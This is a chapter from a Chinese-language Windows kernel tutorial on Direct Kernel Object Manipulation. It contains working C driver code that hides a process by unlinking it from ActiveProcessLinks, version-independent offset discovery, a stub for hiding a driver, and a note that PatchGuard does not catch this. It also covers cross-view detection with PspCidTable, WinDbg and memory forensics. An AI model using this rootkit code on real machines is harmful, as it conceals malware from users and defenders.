# Ch 32 — DKOM 與進程隱藏

> 目標：理解 DKOM（Direct Kernel Object Manipulation）的原理，掌握從 ActiveProcessLinks 移除進程讓 `tasklist` 看不到它的技術，以及偵測方法。

## DKOM 是什麼

DKOM = 不呼叫任何 Windows API，直接修改核心資料結構（EPROCESS、ETHREAD、Driver Object 等），達到欺騙系統的效果。

最經典的應用：把惡意進程從 `PsActiveProcessHead` 的雙向連結串列中取出，讓所有依賴 `NtQuerySystemInformation` 的工具（TaskManager、tasklist.exe）看不到它。

**重要**：DKOM 可以欺騙用戶態 API，但無法欺騙直接讀記憶體的工具（如 WinDbg `!process`）和某些 EDR 掃描。

## ActiveProcessLinks 結構

`EPROCESS.ActiveProcessLinks` 是一個 `LIST_ENTRY`（雙向鏈結串列節點）：

```c
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;   // Forward link（下一個）
    struct _LIST_ENTRY *Blink;   // Back link（上一個）
} LIST_ENTRY;
```

Windows 用全域變數 `PsActiveProcessHead`（在 ntoskrnl 的 DataSection）當串列頭。

```
PsActiveProcessHead
    ↓ Flink
[EPROCESS A].ActiveProcessLinks ↔ [EPROCESS B].ActiveProcessLinks ↔ [EPROCESS C].ActiveProcessLinks
     ↑─────────────────────────────────────────────────────────────────────── Blink ─────┘
```

`NtQuerySystemInformation(SystemProcessInformation)` 就是走這個串列。把某個節點拿出來，那個進程就消失了。

## DKOM：從串列移除進程

```c
// 必須知道 EPROCESS.ActiveProcessLinks 的偏移
// 可以從 PDB 取得，或 hardcode 版本特定值
// Win 10 22H2: 0x448
#define ACTIVE_PROCESS_LINKS_OFFSET 0x448

// 注意：這是教育性範例，實際操作需要小心鎖和 PatchGuard
NTSTATUS HideProcess(HANDLE targetPid)
{
    PEPROCESS targetProcess;
    NTSTATUS status = PsLookupProcessByProcessId(targetPid, &targetProcess);
    if (!NT_SUCCESS(status))
        return status;

    // 取得 ActiveProcessLinks 指針
    PLIST_ENTRY targetLinks = (PLIST_ENTRY)
        ((PUCHAR)targetProcess + ACTIVE_PROCESS_LINKS_OFFSET);

    // 標準雙向鏈結串列移除（RemoveEntryList 等價）
    PLIST_ENTRY prev = targetLinks->Blink;
    PLIST_ENTRY next = targetLinks->Flink;

    // 把前後節點直接相連
    prev->Flink = next;
    next->Blink = prev;

    // 讓目標節點指向自己（避免走串列時崩潰）
    targetLinks->Flink = targetLinks;
    targetLinks->Blink = targetLinks;

    ObDereferenceObject(targetProcess);

    DbgPrint("[DKOM] PID %llu hidden from process list\n", (ULONG64)targetPid);
    return STATUS_SUCCESS;
}
```

移除後，`tasklist`、Task Manager、`EnumProcesses` 全部看不到這個進程。但進程**仍在運行**，只是從串列中消失。

## 偏移問題

`ActiveProcessLinks` 的偏移在每個 Windows 版本不同：

| Windows 版本 | 偏移 |
|------------|-----|
| Windows 7 x64 | 0x188 |
| Windows 10 1903 | 0x2F0 |
| Windows 10 21H2 | 0x448 |
| Windows 11 22H2 | 0x448 |
| Windows 11 23H2 | 0x448 |

在實作中需要動態查詢，不能 hardcode：

```c
// 動態查詢偏移（透過 PsGetProcessId 比較）
ULONG FindActiveProcessLinksOffset(void)
{
    PEPROCESS systemProcess = PsInitialSystemProcess;  // PID 4
    
    // 從 EPROCESS 起始往後掃描
    for (ULONG offset = 0; offset < PAGE_SIZE; offset += sizeof(PVOID)) {
        PLIST_ENTRY entry = (PLIST_ENTRY)((PUCHAR)systemProcess + offset);
        
        // ActiveProcessLinks.Flink 指向下一個 EPROCESS + offset
        // 所以 Flink - offset 應該指向有效的 EPROCESS
        __try {
            PEPROCESS candidate = (PEPROCESS)((PUCHAR)entry->Flink - offset);
            if (PsGetProcessId(candidate) != 0) {
                // 進一步驗證：Flink->Blink 應指回自己
                PLIST_ENTRY backLink = (PLIST_ENTRY)((PUCHAR)candidate + offset);
                if (backLink->Blink == entry) {
                    return offset;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            continue;
        }
    }
    return 0;  // 找不到
}
```

## 其他常見 DKOM 技術

### Token 替換（已在 Ch 5/28 討論）

直接寫 `EPROCESS.Token` = SYSTEM 進程的 Token → 提權。

### 進程 PID 隱藏（改 UniqueProcessId）

把 `EPROCESS.UniqueProcessId` 改成 0 或其他值，讓某些 API 找不到它（但更脆）。

### 驅動物件隱藏

從 `\Driver\` Object Directory 移除 DRIVER_OBJECT——`sc query`、`driverquery` 看不到。

```c
// 把驅動物件從目錄中取消連結
// （需要對 Object Directory 結構有深入理解）
NTSTATUS HideDriver(PUNICODE_STRING driverName)
{
    UNICODE_STRING dirName = RTL_CONSTANT_STRING(L"\\Driver");
    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &dirName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
                               NULL, NULL);
    
    HANDLE hDir;
    NTSTATUS status = ZwOpenDirectoryObject(&hDir, DIRECTORY_ALL_ACCESS, &attr);
    if (!NT_SUCCESS(status))
        return status;
    
    // 從 Object Directory 取消連結（需要直接操作 _OBJECT_DIRECTORY 結構）
    // 這部分是未文件化的核心內部結構，省略詳細實作
    
    ZwClose(hDir);
    return STATUS_SUCCESS;
}
```

### 執行緒隱藏（ETHREAD）

`ETHREAD.ThreadListEntry`：從進程的執行緒串列移除。讓 `EnumProcessThreads` / WinDbg `!process ... 7` 看不到執行緒。

## 偵測 DKOM

| 偵測技術 | 原理 |
|---------|------|
| 交叉視圖（Cross-View） | 同時掃描 ActiveProcessLinks + 直接掃描記憶體找 EPROCESS 特徵 |
| PspCidTable 比對 | PID 表（PspCidTable）和 ActiveProcessLinks 進行交叉比對 |
| WinDbg `!process 0 0` | 直接讀核心，不透過 API，能看到隱藏進程 |
| Volatility/Rekall | 記憶體取證工具，掃描 EPROCESS pool tag 'Proc' |

### 交叉視圖偵測範例

```
工具做的事：
1. 用 NtQuerySystemInformation 拿到「可見」進程清單
2. 直接走 PspCidTable（Handle 表，包含所有進程）
3. 比較差集 → 差集中的進程就是被 DKOM 隱藏的

PspCidTable 是 Windows 內部用來把 PID → EPROCESS 的 Handle Table
即使 DKOM 移除 ActiveProcessLinks，PID 在 PspCidTable 中依然存在
```

## WinDbg 驗證

```
; 走 ActiveProcessLinks（看不到隱藏進程）
kd> !process 0 0

; 直接用 PID 查（如果還知道 PID 的話）
kd> !process <pid> 0

; 掃描所有有 Proc tag 的 Pool 分配（繞過 DKOM）
kd> !poolused 2 Proc
```

## PatchGuard 與 DKOM

PatchGuard **不保護** EPROCESS 的大部分欄位（Token、ActiveProcessLinks）。

PatchGuard 保護的是：SSDT、IDT、GDT、MSR、核心代碼頁面的 hash。

所以 DKOM 修改 `ActiveProcessLinks` **不會觸發 KPP（Bugcheck 0x109）**。這是 Windows 設計上的一個灰色地帶。

## 自我檢核

- [ ] `ActiveProcessLinks` 是雙向鏈結串列；DKOM 把節點移除 → API 看不到進程但進程還在跑
- [ ] 偏移版本相依：需要動態查詢或版本表
- [ ] PatchGuard **不保護** ActiveProcessLinks → DKOM 不觸發 0x109
- [ ] 偵測：交叉視圖比對 ActiveProcessLinks vs PspCidTable（PID Handle Table 仍存在）
- [ ] WinDbg `!process <pid> 0` 直接查，不走 API，能看到隱藏進程

→ [Ch 33 WFP 網路過濾](./33-wfp-network-filter.md)
